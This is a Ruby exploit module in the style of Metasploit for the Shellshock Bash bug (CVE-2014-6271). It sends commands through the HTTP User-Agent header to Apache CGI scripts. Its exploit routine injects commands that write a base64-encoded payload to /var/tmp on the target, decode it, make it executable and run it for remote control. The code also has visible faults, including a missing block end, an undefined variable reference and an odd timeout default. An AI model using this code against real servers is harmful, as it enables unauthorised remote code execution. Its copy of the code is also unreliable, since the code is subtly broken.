def initialize(info = {})
  super(update_info(info,
  'Name' => 'Apache mod_cgi Bash Environment Variable Code Injection',
  'Description' => %q{
    This module exploits a code injection in specially crafted environment
    variables in Bash, specifically targeting Apache mod_cgi scripts through
    the HTTP_USER_AGENT variable.
    },
    'Author' => [
      'Stephane Chazelas', # Vulnerability discovery
      'Pablo González'
      ],
      'References' => [
        ['CVE', '2014-6271'],
        ['URL', 'https://access.redhat.com/articles/1200223'],
        ['URL', 'https://seclists.org/oss-sec/2014/g3/649']
      ],
      'Payload' => {
        'DisableNops' => true,
        'BadChars'  => "\x00\x0a\x0d",
        'Space' => 2048
      })

      register_options([
        OptString.new('TARGETURI', [true, 'Path to CGI script']),
        OptString.new('METHOD', [true, 'Http method to use', 'GET',['GET', 'POST']]),
        OptString.new('RPATH', [true, 'Target PATH for binaries used by the CmdStager', '/bin']),
        OptString.new('COMMAND', [true, 'Command injection in BASH', 'ls -la']),
        OptString.new('FULL', [false, 'Launch all process, 4 requests for taking remote control', 'false']),
        OptString.new('NAMESHELLBIN', [false, 'Name Shell', 'poc']),
        OptString.new('TIMEOUT', [true, 'HTTP read response timeout (seconds)', 's'])
        ], self.class)
end

def request(command)
  print_status "Command: #{command}"
  r = send_request_cgi(
    {
      'method' => datastore['METHOD'],
      'uri' =>  datastore['TARGETURI'],
      'agent' => "() { :; }; echo;#{command} "
    }, datastore['TIMEOUT'])
    return r
end

def check
  #print_status target_uri.path.to_s
  r = request("echo hola")
  if r.body.include?("hola")
    Exploit::CheckCode::Vulnerable
  else
    Exploit::CheckCode::Safe
end

def exploit
  if datastore['FULL'] == "true"
  #conplete execution shellcode
    #puts payload.methods
    pay = payload.encoded_exe
    print_status "Payload: #{datastore['PAYLOAD']}"
    print_status "Lenght: #{pay.length.to_s}"
    enc = Base64.encode64(pay).chomp
    enc.gsub!("\n", "")
    print_status enc

    r = request("/bin/echo #{enc} > /var/tmp/#{datastore['NAMESHELLBIN']}")

    r = request("/usr/bin/base64 -d /var/tmp/#{datastore['NAMESHELLBIN']} > /var/tmp/#{NAMESHELLBIN}_bin")

    r = request("/bin/chmod 755 /var/tmp/#{datastore['NAMESHELLBIN']}_bin")

    r = request("/var/tmp/#{datastore['NAMESHELLBIN']}_bin")
end
